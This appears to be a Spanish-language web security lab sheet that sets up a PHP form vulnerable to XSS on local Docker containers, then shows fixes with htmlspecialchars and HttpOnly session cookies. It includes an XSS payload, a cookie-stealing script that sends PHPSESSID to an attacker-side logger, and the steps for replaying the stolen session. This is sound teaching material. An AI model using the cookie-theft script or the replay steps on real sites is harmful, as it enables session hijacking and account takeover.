---
typora-copy-images-to: ../assets/images/2022-03-15-Validacion/
typora-root-url: ../
title: Validación
---

# Validación

En esta práctica vamos a aprender a protegernos de diferentes tipos de ataque.

## XSS (Cross-Site-Scripting)

Vamos a simular un ataque de Cross-Site Scripting (XSS) a través de un formulario y a aprender cómo protegernos de este tipo de ataques. Para ello prepara un contenedor Docker con apache y php (puedes seguir esta [práctica](https://victorponz.github.io/Ciberseguridad-PePS/tema2/docker/2021/01/09/Pr%C3%A1ctica-Docker.html) de Docker para crearlo), pero no lo pongas en marcha aún.

La forma más básica para introducir datos en una web es mediante un formulario. Vamos a crear uno que lo único que hace es mostrar los datos que se han introducido. Crea el archivo `post.php`con el siguiente contenido y mételo en el directorio del contenedor:

```php+HTML
<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="utf-8">
</head>
<body>

<?php
if ($_SERVER['REQUEST_METHOD'] == "GET") {
?>
<p>Nuevo Post</p>
<form action='post.php' method='post'>
	<textarea name="textarea" rows="10" cols="50">Escribe algo aquí</textarea>
	<input type = 'submit' value='enviar'>
</form>
<?php
}else
	echo $_POST["textarea"] ?? "";
?>
</body>
</html>
```

Pon en marcha el contenedor:

```bash
docker build -t victima .
docker run --detach --rm -p8080:80 -v name:/data --name="victima" victima
```

Y accede a `localhost:8080/post.php`. Escribe algo y pulsa "enviar". Verás que devuelve cualquier cosa que escribas. Ahora escribe `<script>alert('hackeado')</script>` y pulsa el botón...

![image-20220317162135979](/assets/images/2022-03-15-Validacion/image-20220317162135979.png)

No podemos confiar en que los usuarios van a introducir los datos que esperamos, siempre va a haber alguien que intente obtener acceso utilizando técnicas de inyección de código, por lo que debemos estar prevenidos. Para ello podemos usar en PHP la función `htmlspecialchars` o `htmlentities`, aunque todavía mejor si usamos un purificador como [HTML Purifier](http://htmlpurifier.org/). Vamos a sanear el código anterior con `htmlspecialchars`:

```php+HTML
<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="utf-8">
</head>
<body>

<?php
if ($_SERVER['REQUEST_METHOD'] == "GET") {
?>
<p>Nuevo Post</p>
<form action='post.php' method='post'>
	<textarea name="textarea" rows="10" cols="50">Escribe algo aquí</textarea>
	<input type = 'submit' value='enviar'>
</form>
<?php
}else
	echo htmlspecialchars($_POST["textarea"]) ?? "";
?>
</html>
```

Recarga el contenedor y vuelve a probar el código malicioso. Ahora no ejecuta el código introducido:

![image-20220317164035266](/assets/images/2022-03-15-Validacion/image-20220317164035266.png)

## Autenticación con sesiones

La sesión de usuario es un componente fundamental en cualquier aplicación web, ya que permite identificar a un usuario entre diversas solicitudes y ofrecer una interacción personal con la aplicación. El mecanismo que controla las sesiones es un objetivo de ataque importante. Para establecer una sesión, el servidor crea un *session ID* único, que se envía al navegador y se guarda en una cookie, permitiendo al servidor asociar la interacción con un usuario concreto. El atacante lo que va a buscar es apoderarse de ese identificador para hacerse pasar por un usuario legítimo.

### Robo de sesión

Vamos a simular un secuestro de sesión. Para ello crea otra imagen docker como la que has creado antes, que se llame "atacante" y que escuche en el puerto 8081. Después crea el archivo `robo-de-sesion.php`:

```php
<?php
$session_robada = $_GET['session_robada'] ?? "";
$session_robada .= "\n";
$fichero = 'data/sessions.txt';
// Abre el fichero para obtener el contenido existente
$actual = file_get_contents($fichero);
// Escribe el contenido al fichero
file_put_contents($fichero, $session_robada, FILE_APPEND);
```

Ahora vuelve al docker anterior (victima) y crea el archivo `login.php` para crear un formulario de inicio de sesión en PHP, con el siguiente contenido:

```php
<?php
session_start();

//En una aplicación real, los usuarios estarían almaenados en la base de datos
$all_users = array ("mario" => "qwerty", "juan" => "123456");
$valid_users = array_keys($all_users);

$ya_registrado = $_SESSION['ya_registrado'] ?? false;


if ($_SERVER['REQUEST_METHOD'] == "POST" && !$ya_registrado){
	$usuario = $_POST['usuario'] ?? "";
	$password = $_POST['password'] ?? "";
    
	$ya_registrado = (in_array($usuario, $valid_users)) && ($password == $all_users[$usuario]);
	if ($ya_registrado){login.php
		$_SESSION['ya_registrado'] = true;
		$_SESSION['usuario'] = $usuario;
	}
}

if ($ya_registrado){
	// Si llega aqui es porque es un usuario válido.
	echo "<p>Welcome " . $_SESSION['usuario'] . "</p>";
	echo "<p>Congratulations, you are into the system.</p>";
}else{
?>
	
	<form action='login.php' method='post'>
		Usuario: <input type='text' name = "usuario" id="usuario" value=""><br>
		Contraseña: <input type='password' name = "password" id = "password" value=""><br>
		<input type='submit' value='Enviar'>
	</form>
<?php
}
?>
```

Crea también el archivo `logout.php` para el fin de sesión:

```php
<?php
//logout.php
session_start();
session_unset();
session_destroy();
//redirigimos a login.php
header('Location: login.php');
```

Y el archivo `hackeada.php`:

```php+HTML
<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="utf-8">
</head>
<body>
    Esta es una página que ha sido hackeada mediante XSS.
Al acceder, envía la cookie de sesión al sitio http://evil.local
<script>
var c = document.cookie.replace(/(?:(?:^|.*;\s*)PHPSESSID\s*\=\s*([^;]*).*$)|^.*$/, "$1")
var myImage = new Image(1,1);
myImage.src = "http://127.0.0.1:8081/robo-de-sesion.php?session_robada=" + c;
</script>
</body>
</html>
```

Si no has creado un volumen persistente, tendrás que parar los contenedores, volver a construir la imagen para introducir los archivos nuevos en el contenedor e iniciarlos de nuevo. Ahora accede a `localhost:8080/login.php` e introduce las credenciales "juan" y contraseña "123456":

![image-20220329155357327](/assets/images/2022-03-15-Validacion/image-20220329155357327.png)

Muy bien, ya hemos iniciado sesión. Ahora accede a `localhost:8080/hackeada.html`:

![image-20220329155746160](/assets/images/2022-03-15-Validacion/image-20220329155746160.png)

Ahora, si vemos la cookie con el id de sesión (pulsa F12 para abrir Firebug y pulsa en "Red"):

![image-20220329172148469](/assets/images/2022-03-15-Validacion/image-20220329172148469.png)

También vemos cómo envía el id de sesión al atacante (por motivos técnicos, el atacante ahora es el 8080):

![image-20220329172328207](/assets/images/2022-03-15-Validacion/image-20220329172328207.png)

Y si vamos a la ruta donde docker guarda el volumen persistente y vemos el contenido del archivo `sessions.txt`, vemos que se ha almacenado correctamente el id de sesión robado:

![image-20220329172428826](/assets/images/2022-03-15-Validacion/image-20220329172428826.png)

Ahora abre una nueva sesión del navegador (una ventana privada por ejemplo) y ve a la página de login de nuevo. Sin introducir ningún usuario, abre Firebug, selecciona el GET y ve a "Cabeceras", Editar y volver a enviar. Entonces editas el id de sesión y al enviar ya serás un usuario nuevo:

![image-20220329173419912](/assets/images/2022-03-15-Validacion/image-20220329173419912.png)

![image-20220329173617144](/assets/images/2022-03-15-Validacion/image-20220329173617144.png)

![image-20220329173653978](/assets/images/2022-03-15-Validacion/image-20220329173653978.png)

Ahora soy juan, sin haber introducido ningún usuario ni contraseña  :-)

### Evitar el robo de sesión

En realidad este tipo de ataque tiene poca repercusión hoy en día, porque protegerse contra él es tan sencillo como incluir una directiva en la configuración. Modifica `login.php` con este código y comprueba que al visitar `hackeada.php` el atacante ya no recibe el id de sesión:

```
<?php
ini_set( 'session.cookie_httponly', 1 );
session_start();
```

También es recomendable una configuración para que sólo se envíen cookies sobre conexiones seguras, pero no la ponemos porque nuestra web no usa https:

```
ini_set( 'session.cookie_secure', 1);
```

